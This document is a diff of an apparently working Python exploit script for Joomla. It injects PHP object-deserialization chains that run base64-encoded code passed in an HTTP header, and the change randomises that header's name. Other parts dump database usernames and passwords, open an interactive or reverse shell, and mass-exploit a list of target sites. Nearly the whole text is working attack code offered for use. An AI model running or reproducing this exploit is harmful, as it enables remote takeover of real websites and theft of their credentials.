@@ -7,7 +7,9 @@ import urllib2
 from urllib2 import Request, urlopen, URLError, HTTPError
 import httplib
 import sys
+import random
 import argparse
+import string
 import os
 import readline
 import socket
@@ -39,32 +41,34 @@ def php_encoder(php_payload): # infodox style
     f = open(php_payload, "r").read()
     f = f.replace("<?php", "")
     f = f.replace("?>", "")
-    encoded = f.encode('base64')
-    encoded = encoded.replace("\n", "")
-    encoded = encoded.strip()
+    encoded = f.encode('base64').replace("\n", "").strip()
     return encoded
 
-def build_chain():
+def build_chain(evil):
     one = """}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\\0\\0\\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";"""
-    two = "eval(base64_decode(ZXZhbChiYXNlNjRfZGVjb2RlKCRfU0VSVkVSWydIVFRQX1BPUCddKSk7));JFactory::getConfig();exit;"
+    two = """eval(base64_decode('%s'));JFactory::getConfig();exit;""" %(evil)
     three = """";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\\0\\0\\0connection";b:1;}"""
     four = '\xf0\xfd\xfd\xfd'
     payload = """%ss:%d:\"%s%s%s""" %(one, len(two), two, three, four)
     return payload
 
-def build_chain2():
-    one = """jklmj}__jklmjklmjk|O:21:"JDatabaseDriverMysqli":3:{s:4:"\\0\\0\\0a";O:17:"JSimplepieFactory":0:{}s:21:"\\0\\0\\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:5:"cache";b:1;s:19:"cache_name_function";s:6:"assert";s:10:"javascript";i:9999;s:8:"feed_url";"""
-    two = "eval(base64_decode(ZXZhbChiYXNlNjRfZGVjb2RlKCRfU0VSVkVSWydIVFRQX1BPUCddKSk7));JFactory::getConfig();exit;"
+def build_chain2(evil):
+    one = """ewah}__jgkaeg|O:21:"JDatabaseDriverMysqli":3:{s:4:"\\0\\0\\0a";O:17:"JSimplepieFactory":0:{}s:21:"\\0\\0\\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:5:"cache";b:1;s:19:"cache_name_function";s:6:"assert";s:10:"javascript";i:9999;s:8:"feed_url";"""
+    two = """eval(base64_decode('%s'));JFactory::getConfig();exit;""" %(evil)
     three  = """";}i:1;s:4:"init";}}s:13:"\\0\\0\\0connection";i:1;}'"""
     four = '\xf0\xfd\xfd\xfd'
     payload = """%ss:%d\"%s%s%s""" %(one, len(two), two, three, four)
     return payload
 
 def hack(url, header, php_payload, pop_chain, ipback, port):
+    rand = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(4))
+    evil = """eval(base64_decode($_SERVER['HTTP_%s']));""" %(rand)
+    evil = evil.encode('base64').replace("\n", "").strip()
+
     if pop_chain == '1':
-        pop_chain = build_chain()
+        pop_chain = build_chain(evil=evil)
     if pop_chain == '2':
-        pop_chain = build_chain2()
+        pop_chain = build_chain2(evil=evil)
 
     try:
         req = urllib2.Request(url)
@@ -96,7 +100,7 @@ def hack(url, header, php_payload, pop_chain, ipback, port):
         req2 = urllib2.Request(url)
         req2.add_header('cookie', cookie)
         req2.add_header('X-Backwarded-For', "; ".join('%s=%s' % (k,v) for k,v in backvals.items()))
-        req2.add_header('POP', php_payload)
+        req2.add_header(rand, php_payload)
         req2.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0')
 
         try:
@@ -133,7 +137,9 @@ def grip_deets(url, pop_chain):
     grip += "d1sncGFzc3dvcmQnXS4iXG4iOwogICAgIH0KIH0gZWxzZSB7CiAgICAgZWNobyAiWy1dIFVzZXJ0"
     grip += "YWJsZSBkdW1wIGZ1Y2tlZCB1cC4gSXMgdGhlcmUgbm8gdXNlcnM/XG4iOwogfQogJGNvbm5lY3Rp"
     grip += "b24tPmNsb3NlKCk7CiAK"
+
     read = hack(url=url, header="xff", php_payload=grip, pop_chain=pop_chain, ipback=None, port=None)
+    
     if read == None:
         return "[!] nope"
     elif read.find("DBMS") == -1:
@@ -159,7 +165,6 @@ def shell(url, pop_chain): # mostly infodox 'pty'
                 print "\n".join(read)
             else:
                 print read.split("</html>")[1]
-            
 
 def main():
     banner()
@@ -204,15 +209,15 @@ def main():
                 for l in f:
                     l = l.replace("\n","")
                     print "[+] This site: http://%s/" %(l)
-                    l = "http://%s/" %(l)
+                    l = "http://%s" %(l)
                     print grip_deets(url=l, pop_chain=args.pop_chain)
                    
         else:
             print "[+] Mass shellin' of the joomlols is a go!"
-            with open(args.targets) as f:
+            with open(args.targets, "r") as f:
                 for l in f:
                     l = l.replace("\n","")
-                    l = "http://%s/" %(l)
+                    l = "http://%s" %(l)
                     print hack(url=l, header=args.header, php_payload=php_encoder(args.php_payload), pop_chain=args.pop_chain, ipback=None, port=None)
     elif args.php_payload == None and args.ipback == None and args.port == None:
         parser.error("reverse shell depends on -p pay_load --host 127.0.0.1 --port 4444")
